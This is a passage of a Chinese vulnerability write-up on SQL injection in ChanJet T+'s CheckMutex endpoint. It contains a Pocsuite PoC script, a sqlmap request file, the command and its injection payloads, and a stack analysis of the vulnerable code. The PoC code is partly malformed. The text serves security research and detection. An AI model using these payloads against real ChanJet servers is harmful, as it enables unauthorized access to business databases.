class="string">&#x27;2022-09-23&#x27;</span>  <span class="comment"># 漏洞公开的时间,不知道就写今天</span></span><br><span class="line">    createDate = <span class="string">&#x27;2022-09-23&#x27;</span>  <span class="comment"># 编写 PoC 的日期</span></span><br><span class="line">    updateDate = <span class="string">&#x27;2022-09-23&#x27;</span>  <span class="comment"># PoC 更新的时间,默认和编写时间一样</span></span><br><span class="line">    references = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># 漏洞地址来源,0day不用写</span></span><br><span class="line">    name = <span class="string">&#x27;畅捷通T+ SQL上传&#x27;</span>  <span class="comment"># PoC 名称</span></span><br><span class="line">    appPowerLink = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 漏洞厂商主页地址</span></span><br><span class="line">    appName = <span class="string">&#x27;畅捷通T+&#x27;</span>  <span class="comment"># 漏洞应用名称</span></span><br><span class="line">    appVersion = <span class="string">&#x27;&#x27;&#x27;13.0 &lt;= 畅捷通T+单机版&lt;=16.0且使用IIS10.0以下版本&#x27;&#x27;&#x27;</span>  <span class="comment"># 漏洞影响版本</span></span><br><span class="line">    vulType = VUL_TYPE.UPLOAD_FILES  <span class="comment"># 漏洞类型,类型参考见 漏洞类型规范表</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        CNVD-2022-60632 畅捷通T+ SQL漏洞</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 漏洞简要描述</span></span><br><span class="line">    samples = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># 测试样列,就是用 PoC 测试成功的网站</span></span><br><span class="line">    install_requires = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span></span><br><span class="line">    pocDesc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    category = POC_CATEGORY.EXPLOITS.REMOTE</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.url.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">            path = <span class="string">&quot;tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            path = <span class="string">&quot;/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex&quot;</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.url.startswith(<span class="string">&#x27;http://&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> url.startswith(<span class="string">&#x27;https://&#x27;</span>):</span><br><span class="line">            url = <span class="string">&#x27;http://&#x27;</span> + self.url</span><br><span class="line">        url = self.url + path</span><br><span class="line">        headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">        data = <span class="string">&#x27;&#x27;&#x27;&#123;&quot;accNum&quot;: &quot;3&#x27;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span></span><br><span class="line"><span class="string">        # data = &#x27;&#x27;&#x27;</span>&#123;<span class="string">&quot;accNum&quot;</span>: <span class="string">&quot;3&#x27; AND (select )-- NCab&quot;</span>, <span class="string">&quot;functionTag&quot;</span>: <span class="string">&quot;SYS0104&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        print(f&quot;数据: &#123;data&#125;&quot;)</span></span><br><span class="line"><span class="string">        print(f&quot;扫描目标: &#123;url&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        try:</span></span><br><span class="line"><span class="string">            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span></span><br><span class="line"><span class="string">            repData =requests.post(url, headers=headers, data=data, timeout=1000, verify=False)</span></span><br><span class="line"><span class="string">            print(f&quot;响应: &#123;repData.text&#125;&quot;)</span></span><br><span class="line"><span class="string">            if &quot;Microsoft SQL Server&quot; in repData.text and &quot;error&quot; not in repData.text:</span></span><br><span class="line"><span class="string">            #if repData.status_code == 200:</span></span><br><span class="line"><span class="string">                result[&#x27;VerifyInfo&#x27;] = &#123;&#125;</span></span><br><span class="line"><span class="string">                result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = url </span></span><br><span class="line"><span class="string">                result[&#x27;VerifyInfo&#x27;][&#x27;message&#x27;] = repData.text</span></span><br><span class="line"><span class="string">                result[&#x27;VerifyInfo&#x27;][&#x27;shell&#x27;] = self.url + &#x27;/tplus/UFAQD/InitServerInfo.aspx?preload=1&#x27;                </span></span><br><span class="line"><span class="string">        except Exception as e:</span></span><br><span class="line"><span class="string">            print(e)</span></span><br><span class="line"><span class="string">            return</span></span><br><span class="line"><span class="string">        return self.parse_output(result)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def _attack(self):</span></span><br><span class="line"><span class="string">        return self._verify()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def parse_attack(self, result):</span></span><br><span class="line"><span class="string">        output = Output(self)</span></span><br><span class="line"><span class="string">        if result:</span></span><br><span class="line"><span class="string">            output.success(result)</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            output.fail(&#x27;target is not vulnerable&#x27;)</span></span><br><span class="line"><span class="string">        return output</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def _shell(self):</span></span><br><span class="line"><span class="string">        return</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def parse_output(self, result):</span></span><br><span class="line"><span class="string">        output = Output(self)</span></span><br><span class="line"><span class="string">        if result:</span></span><br><span class="line"><span class="string">            output.success(result)</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            output.fail(&#x27;target is not vulnerable&#x27;)</span></span><br><span class="line"><span class="string">        return output</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">register_poc(ChanJetPOC)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>使用 pocsuit 执行上述 poc 结果如下所示：</p><style>.ygxaacukezkw{zoom:80%;}</style><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/image-20240407082635186.png" class="ygxaacukezkw" alt="POC 执行结果"><p>可以看到执行的 POC 为 <code>&#123;&quot;accNum&quot;: &quot;3&#39;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</code> ，查询语句为 <code>select @@version</code> ，并且查询返回了 SQL Server 的版本为 <code>Microsoft SQL Server 2022 (RTM)……</code>。</p><h3 id="使用-SqlMap-检测"><a href="#使用-SqlMap-检测" class="headerlink" title="使用 SqlMap 检测"></a>使用 SqlMap 检测</h3><p>根据上述 POC 编写 sqlmap 的检测文件。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># sql.txt</span><br><span class="line">POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/css,*/*;q=0.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&#123;&quot;accNum&quot;: &quot;3&#x27;&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br></pre></td></tr></table></figure><p>使用 sqlmap 执行上述检测文件，如果为 sqlmap 不熟悉，可以参考这篇文章：<a href="https://blog.csdn.net/weixin_43819747/article/details/136736688">【SQL注入】Sqlmap使用指南(手把手保姆版)持续更新_web union sql 注入 测试工具-CSDN博客</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r sql.txt --random-agent -v <span class="number">3</span> --dbms mssql --hex -p &quot;accNum&quot; --batch</span><br></pre></td></tr></table></figure><p>这里对上述执行命令稍加说明：</p><p><code>-r</code>: 指定从文件中加载 http 请求</p><p><code>--random-agent</code>：使用随机选择的HTTP User-Agent头部值</p><p><code>-v</code>: 详细级别: 0-6（默认为1）</p><p><code>--dbms</code>: 指定是数据库名</p><p><code>--hex</code>: 在数据检索过程中使用十六进制转换</p><p><code>-p</code>: 可测试的参数</p><p><code>--batch</code>: 不要询问用户输入,使用默认行为</p><p>运行完上述命令之后就会生成 sql 漏洞相关注入点，以畅捷通 SQL 漏洞为例，输出如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: JSON accNum ((custom) POST)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)</span><br><span class="line">    Payload: &#123;&quot;accNum&quot;: &quot;3&#x27; AND 3159 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (3159=3159) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113)))-- zxmb&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br><span class="line">    Vector: AND [RANDNUM] IN (SELECT (&#x27;[DELIMITER_START]&#x27;+([QUERY])+&#x27;[DELIMITER_STOP]&#x27;))</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 22 columns</span><br><span class="line">    Payload: &#123;&quot;accNum&quot;: &quot;3&#x27; UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(113)+CHAR(72)+CHAR(103)+CHAR(87)+CHAR(72)+CHAR(115)+CHAR(109)+CHAR(84)+CHAR(82)+CHAR(117)+CHAR(65)+CHAR(80)+CHAR(105)+CHAR(112)+CHAR(84)+CHAR(81)+CHAR(66)+CHAR(116)+CHAR(120)+CHAR(73)+CHAR(103)+CHAR(106)+CHAR(79)+CHAR(71)+CHAR(102)+CHAR(80)+CHAR(110)+CHAR(104)+CHAR(75)+CHAR(113)+CHAR(116)+CHAR(82)+CHAR(114)+CHAR(112)+CHAR(117)+CHAR(82)+CHAR(104)+CHAR(89)+CHAR(105)+CHAR(114)+CHAR(73)+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- nhDS&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br><span class="line">    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]</span><br><span class="line">---</span><br><span class="line">web server operating system: Windows</span><br><span class="line">web application technology: Nginx 1.16.1, ASP.NET, ASP.NET 4.0.30319</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2022</span><br></pre></td></tr></table></figure><p>以下是【文心一言】对上述结果的解读：</p><blockquote><p>SQLMap 的输出显示了它已识别到的 SQL 注入点，并提供了详细的注入类型和对应的 payload。这是它自动检测到的潜在安全漏洞。</p><p>以下是关于输出的一些解释：</p><ol><li>注入点信息<ul><li><strong>参数</strong>：<code>JSON accNum</code> 是一个 JSON 格式的 POST 请求参数，它是 SQL 注入的入口点。</li><li>类型<ul><li><strong>error-based</strong>：基于错误的注入类型，它利用数据库错误消息来推断 SQL 查询的结构。</li><li><strong>UNION query</strong>：UNION 查询注入类型，它利用 SQL 的 UNION 语句来合并多个查询结果。</li></ul></li></ul></li><li>Payload<ul><li>Payload 是 SQLMap 构造的恶意输入，用于触发 SQL 注入并提取信息。例如，<code>3&#39; AND 3159 IN (SELECT ...</code> 就是一个用于触发基于错误的注入的 payload。</li></ul></li><li>Vector<ul><li>Vector 是 SQLMap 使用的注入模板，用于构造具体的 payload。</li></ul></li><li>Web 服务器操作系统和技术<ul><li>SQLMap 还识别了目标服务器的操作系统（Windows）以及使用的 web 技术（Nginx 1.16.1, ASP.NET, ASP.NET 4.0.30319）。</li></ul></li><li>后端数据库管理系统<ul><li>识别出的后端数据库是 Microsoft SQL Server 2022。</li></ul></li></ol><p>根据这些信息，您可以进一步分析目标系统的安全性，并考虑采取适当的措施来修复这些 SQL 注入漏洞。这可能包括更新或修补应用程序代码、使用参数化查询或预编译的语句来防止 SQL 注入，以及限制对数据库的访问权限等。</p><p>请注意，在实际环境中，一旦发现了 SQL 注入漏洞，您应该立即通知相关的系统管理员或安全团队，并避免未经授权地访问或利用这些漏洞。</p></blockquote><h2 id="堆栈分析"><a href="#堆栈分析" class="headerlink" title="堆栈分析"></a>堆栈分析</h2><h4 id="SQL-执行堆栈"><a href="#SQL-执行堆栈" class="headerlink" title="SQL 执行堆栈"></a>SQL 执行堆栈</h4><p>SQL 执行函数：</p><p>ExecuteReader 执行的 SQL 注入的参数：</p><p>“select id,UseLogID,Acaa_Num,UserID,UserName,PersonName,Url,HostAddress,HostName,FunctionTag,FunctionName,BeginTime,State,Version,Description,TaskID,ModelClassType,ModelType,ClientType,ServerAddress from EAP_Mutex with(nolock) where userid &lt;&gt;  N’’ and Acaa_Num &#x3D;  N’6’and (select @@version)&gt;0– N’ and  Version &#x3D; ‘YWTPro N’ order by begintime”</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">System.Data.dll!System.Data.SqlClient.SqlCommand.ExecuteReader(System.Data.CommandBehavior behavior, <span class="built_in">string</span> method) (IL=<span class="number">0x0000</span>, Native=<span class="number">0x00007FF928E40F90</span>+<span class="number">0x37</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原型</span></span><br><span class="line"><span class="comment">// Token: 0x060019A2 RID: 6562 RVA: 0x000B587C File Offset: 0x000B4C7C</span></span><br><span class="line"><span class="function"><span class="keyword">internal</span> SqlDataReader <span class="title">ExecuteReader</span>(<span class="params">CommandBehavior behavior, <span class="built_in">string</span> method</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    SqlConnection.ExecutePermission.Demand();</span><br><span class="line">    <span class="keyword">this</span>._pendingCancel = <span class="literal">false</span>;</span><br><span class="line">    SqlStatistics statistics = <span class="literal">null</span>;</span><br><span class="line">    TdsParser target = <span class="literal">null</span>;</span><br><span class="line">    RuntimeHelpers.PrepareConstrainedRegions();</span><br><span class="line">    <span class="built_in">bool</span> success = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">int</span>? sqlExceptionNumber = <span class="literal">null</span>;</span><br><span class="line">    SqlDataReader result;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.WriteBeginExecuteEvent();</span><br><span class="line">        target = SqlInternalConnection.GetBestEffortCleanupTarget(<span class="keyword">this</span>._activeConnection);</span><br><span class="line">        statistics = SqlStatistics.StartTimer(<span class="keyword">this</span>.Statistics);</span><br><span class="line">        SqlDataReader sqlDataReader = <span class="keyword">this</span>.RunExecuteReader(behavior, RunBehavior.ReturnImmediately, <span class="literal">true</span>, method);</span><br><span class="line">        success = <span class="literal">true</span>;</span><br><span class="line">        result = sqlDataReader;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (SqlException ex)</span><br><span class="line">    &#123;</span><br><span class="line">        sqlExceptionNumber = <span class="keyword">new</span> <span class="built_in">int</span>?(ex.Number);</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (OutOfMemoryException e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>._activeConnection.Abort(e);</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (StackOverflowException e2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>._activeConnection.Abort(e2);</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ThreadAbortException e3)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>._activeConnection.Abort(e3);</span><br><span class="line">        SqlInternalConnection.BestEffortCleanup(target);</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span></span><br><span class="line">    &#123;</span><br><span class="line">        SqlStatistics.StopTimer(statistics);</span><br><span class="line">        <span class="keyword">this</span>.WriteEndExecuteEvent(success, sqlExceptionNumber, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="漏洞堆栈"><a href="#漏洞堆栈" class="headerlink" title="漏洞堆栈"></a>漏洞堆栈</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Ufida.T.SM.UIP.dll!Ufida.T.SM.UIP.MultiCompanyController.CheckMutex(<span class="built_in">string</span> url, <span class="built_in">string</span> accNum, <span class="built_in">string</span> functionTag) (IL=prolog, Native=<span class="number">0x00007FF8F4474D30</span>+<span class="number">0x0</span>)</span><br><span class="line"> [本机到托管的转换]</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(<span class="built_in">object</span> obj, <span class="built_in">object</span>[] parameters, <span class="built_in">object</span>[] arguments) (IL≈<span class="number">0x0016</span>, Native=<span class="number">0x00007FF94CA3F9A0</span>+<span class="number">0x84</span>)</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.Invoke(<span class="built_in">object</span> obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, <span class="built_in">object</span>[] parameters, System.Globalization.CultureInfo culture) (IL=epilog, Native=<span class="number">0x00007FF94CA57300</span>+<span class="number">0x92</span>)</span><br><span class="line"> mscorlib.dll!System.Reflection.MethodBase.Invoke(<span class="built_in">object</span> obj, <span class="built_in">object</span>[] parameters) (IL=epilog, Native=<span class="number">0x00007FF94CAD6AE0</span>+<span class="number">0x22</span>)</span><br><span class="line"> AjaxPro<span class="number">.2</span>.dll!AjaxPro.AjaxProcHelper.Run() (IL≈<span class="number">0x066C</span>, Native=<span class="number">0x00007FF8F44599A0</span>+<span class="number">0xAD3</span>)</span><br><span class="line"> AjaxPro<span class="number">.2</span>.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context) (IL=<span class="number">0x0010</span>, Native=<span class="number">0x00007FF8F4459900</span>+<span class="number">0x3A</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() (IL≈<span class="number">0x018D</span>, Native=<span class="number">0x00007FF93CA37CD0</span>+<span class="number">0x21E</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.ExecuteStepImpl(System.Web.HttpApplication.IExecutionStep step) (IL=epilog, Native=<span class="number">0x00007FF93C9FADA0</span>+<span class="number">0x4B</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.ExecuteStep(System.Web.HttpApplication.IExecutionStep step, <span class="keyword">ref</span> <span class="built_in">bool</span> completedSynchronously) (IL≈<span class="number">0x0015</span>, Native=<span class="number">0x00007FF93C9FAE00</span>+<span class="number">0x5D</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.PipelineStepManager.ResumeSteps(System.Exception error) (IL≈<span class="number">0x027A</span>, Native=<span class="number">0x00007FF93CA0E650</span>+<span class="number">0x5CF</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.BeginProcessRequestNotification(System.Web.HttpContext context, System.AsyncCallback cb) (IL=<span class="number">0x0031</span>, Native=<span class="number">0x00007FF93C9F9AB0</span>+<span class="number">0x7D</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpRuntime.ProcessRequestNotificationPrivate(System.Web.Hosting.IIS7WorkerRequest wr, System.Web.HttpContext context) (IL≈<span class="number">0x00B0</span>, Native=<span class="number">0x00007FF93CA0CCA0</span>+<span class="number">0xE0</span>)</span><br><span class="line"> System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotificationHelper(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, <span class="built_in">int</span> flags) (IL≈<span class="number">0x0131</span>, Native=<span class="number">0x00007FF93C9FBE90</span>+<span class="number">0x4DC</span>)</span><br><span class="line"> System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotification(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, <span class="built_in">int</span> flags) (IL≈<span class="number">0x0000</span>, Native=<span class="number">0x00007FF93C9FBE50</span>+<span class="number">0x14</span>)</span><br><span class="line"> [托管到本机的转换]</span><br><span class="line"> System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotificationHelper(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, <span class="built_in">int</span> flags) (IL≈<span class="number">0x01E7</span>, Native=<span class="number">0x00007FF93C9FBE90</span>+<span class="number">0x607</span>)</span><br><span class="line"> System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotification(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, <span class="built_in">int</span> flags) (IL≈<span class="number">0x0000</span>, Native=<span class="number">0x00007FF93C9FBE50</span>+<span class="number">0x14</span>)</span><br><span class="line"> [程序域转换]</span><br></pre></td></tr></table></figure><p>主要看方法 <code>Ufida.T.SM.UIP.dll!Ufida.T.SM.UIP.MultiCompanyController.CheckMutex(string url, string accNum, string functionTag) </code></p><p>入参如下所示：</p><p>其中 <code>CheckMutex</code> 的属性为 <code>AjaxMethod</code> ，然后我们根据入参提供对应的参数即可。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/image-20240418164228754.png" class="" title="CheckMutex"><p>可以看到需要满足 <code>functionTag</code> 为 <code>SYS0104</code>，才能执行 <code>CheckUserFunction</code> 函数，而 <code>CheckUserFunction</code> 执行的就是 <code>accNum</code> 的值。</p><p>然后在执行畅捷通接口 <code>Ufida.T.EAP.Mutex.Interface.IMutex.CheckUserFunction</code> 时报了异常，但是仍然执行了 SQL 。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/image-20240418165341199.png" class="" title="image-20240418165341199"><p>在异常信息中可以看到</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$exception.SqlString <span class="operator">=</span> &quot;select id,UseLogID,Acaa_Num,UserID,UserName,PersonName,Url,HostAddress,HostName,FunctionTag,FunctionName,BeginTime,State,Version,Description,TaskID,ModelClassType,ModelType,ClientType,ServerAddress from EAP_Mutex with(nolock) where userid &lt;&gt;  N&#x27;&#x27; and Acaa_Num =  N&#x27;3&#x27;and (select @@version)&gt;0-- N&#x27; and  Version = &#x27;YWTPro N&#x27; order by begintime&quot;</span><br></pre></td></tr></table></figure><p>可以看下注入前与注入后的SQL语句对比：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span>   </span><br><span class="line">    id,  </span><br><span class="line">    UseLogID,  </span><br><span class="line">    Acaa_Num,  </span><br><span class="line">    UserID,  </span><br><span class="line">    UserName,  </span><br><span class="line">    PersonName,  </span><br><span class="line">    Url,  </span><br><span class="line">    HostAddress,  </span><br><span class="line">    HostName,  </span><br><span class="line">    FunctionTag,  </span><br><span class="line">    FunctionName,  </span><br><span class="line">    BeginTime,  </span><br><span class="line">    State,  </span><br><span class="line">    Version,  </span><br><span class="line">    Description,  </span><br><span class="line">    TaskID,  </span><br><span class="line">    ModelClassType,  </span><br><span class="line">    ModelType,  </span><br><span class="line">    ClientType,  </span><br><span class="line">    ServerAddress</span><br><span class="line"><span class="keyword">from</span> EAP_Mutex</span><br><span class="line"><span class="keyword">with</span>(nolock)</span><br><span class="line"># 上边代码一致</span><br><span class="line"># 注入前</span><br><span class="line"><span class="keyword">where</span>   </span><br><span class="line">    userid <span class="operator">&lt;&gt;</span> N<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span>   </span><br><span class="line">    Acaa_Num <span class="operator">=</span> N<span class="string">&#x27;3N&#x27;</span> <span class="keyword">and</span>   </span><br><span class="line">    Version <span class="operator">=</span> <span class="string">&#x27;YWTPro N&#x27;</span></span><br><span class="line"># 